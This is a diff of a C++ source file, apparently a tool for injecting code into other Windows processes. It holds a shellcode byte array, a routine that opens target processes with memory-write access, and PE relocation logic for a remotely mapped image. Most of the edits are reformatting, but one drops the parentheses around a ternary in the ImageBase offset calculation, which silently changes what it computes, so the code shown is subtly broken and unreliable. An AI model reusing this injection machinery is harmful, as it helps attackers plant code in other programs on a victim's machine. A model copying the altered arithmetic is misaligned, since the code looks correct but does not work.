@@ -74,7 +74,7 @@ char default_shellcode[] =
     "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
     "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
 
-char* default_shellcode_data = default_shellcode;
+char *default_shellcode_data = default_shellcode;
 size_t default_shellcode_size = sizeof(default_shellcode);
 
 //
@@ -115,7 +115,7 @@ HANDLE process_open(RemoteProcessOpenMethod method, uint32_t pid, ACCESS_MASK Ac
         }
 
         bblog::debug("window found, HWND = 0x{:x}", (uintptr_t)opts.hWnd);
-        //return sysapi::ProcessOpenByHwnd(opts.hWnd, AccessMask); // TODO: research access restrictions
+        // return sysapi::ProcessOpenByHwnd(opts.hWnd, AccessMask); // TODO: research access restrictions
         return sysapi::ProcessOpenByHwnd(opts.hWnd, PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_DUP_HANDLE);
     }
     default:
@@ -126,8 +126,7 @@ HANDLE process_open(RemoteProcessOpenMethod method, uint32_t pid, ACCESS_MASK Ac
 
 //
 
-bool process_init_memory(RemoteProcessMemoryContext& ctx, RemoteProcessMemoryMethod method,
-                         HANDLE ProcessHandle, uint32_t pid) {
+bool process_init_memory(RemoteProcessMemoryContext& ctx, RemoteProcessMemoryMethod method, HANDLE ProcessHandle, uint32_t pid) {
 
     switch (method) {
     case RemoteProcessMemoryMethod::AllocateInAddr:
@@ -302,16 +301,16 @@ bool process_memory_create_write_fixup_addr(RemoteProcessMemoryContext& ctx, PVO
 
 bool process_pe_image_relocate(const RemoteProcessMemoryContext& ctx, PVOID ImageBuffer) {
 
-    auto* pDOSHeader = (PIMAGE_DOS_HEADER)ImageBuffer;
+    auto *pDOSHeader = (PIMAGE_DOS_HEADER)ImageBuffer;
 
-    auto* pNT32Header = (PIMAGE_NT_HEADERS32)PTR_ADD(ImageBuffer, pDOSHeader->e_lfanew);
-    auto* pNT64Header = (PIMAGE_NT_HEADERS64)pNT32Header;
+    auto *pNT32Header = (PIMAGE_NT_HEADERS32)PTR_ADD(ImageBuffer, pDOSHeader->e_lfanew);
+    auto *pNT64Header = (PIMAGE_NT_HEADERS64)pNT32Header;
 
     bool is_64 = pNT32Header->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC;
 
-    size_t ImageBaseOffset = pDOSHeader->e_lfanew + (is_64 ?
-        offsetof(IMAGE_NT_HEADERS64, OptionalHeader.ImageBase) :
-        offsetof(IMAGE_NT_HEADERS32, OptionalHeader.ImageBase));
+    size_t ImageBaseOffset = pDOSHeader->e_lfanew + is_64 ?
+                                 offsetof(IMAGE_NT_HEADERS64, OptionalHeader.ImageBase) :
+                                 offsetof(IMAGE_NT_HEADERS32, OptionalHeader.ImageBase);
 
     bblog::info("writing new image base at 0x{:x}...", (uintptr_t)ctx.RemoteBaseAddress);
 
@@ -342,7 +341,7 @@ bool process_pe_image_relocate(const RemoteProcessMemoryContext& ctx, PVOID Imag
     DWORD RelocAddr = 0;
 
     for (WORD i = 0; i < pNT32Header->FileHeader.NumberOfSections; i++) {
-        if (strcmp((char*)pSection[i].Name, ".reloc") == 0) {
+        if (strcmp((char *)pSection[i].Name, ".reloc") == 0) {
             pSection = &pSection[i];
             RelocAddr = pSection->PointerToRawData;
             break;
@@ -354,18 +353,18 @@ bool process_pe_image_relocate(const RemoteProcessMemoryContext& ctx, PVOID Imag
         return false;
     }
 
-    IMAGE_DATA_DIRECTORY relocData = is_64 ?
-        pNT64Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC] :
-        pNT32Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+    IMAGE_DATA_DIRECTORY relocData =
+        is_64 ? pNT64Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC] :
+                pNT32Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
 
     for (DWORD dwOffset = 0; dwOffset < relocData.Size;) {
 
-        auto* pBlockheader = (PBASE_RELOCATION_BLOCK)PTR_ADD(ImageBuffer, RelocAddr + dwOffset);
+        auto *pBlockheader = (PBASE_RELOCATION_BLOCK)PTR_ADD(ImageBuffer, RelocAddr + dwOffset);
         dwOffset += sizeof(BASE_RELOCATION_BLOCK);
 
         DWORD dwEntryCount = (pBlockheader->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
 
-        auto* pBlocks = (PBASE_RELOCATION_ENTRY)PTR_ADD(ImageBuffer, RelocAddr + dwOffset);
+        auto *pBlocks = (PBASE_RELOCATION_ENTRY)PTR_ADD(ImageBuffer, RelocAddr + dwOffset);
 
         for (DWORD j = 0; j < dwEntryCount; j++) {
 
@@ -578,7 +577,6 @@ bool system_init_live_dump(kernel_dump::kernel_dump_context_t& ctx) {
     }
 
     return true;
-
 }
 
-}
+} // namespace scripts
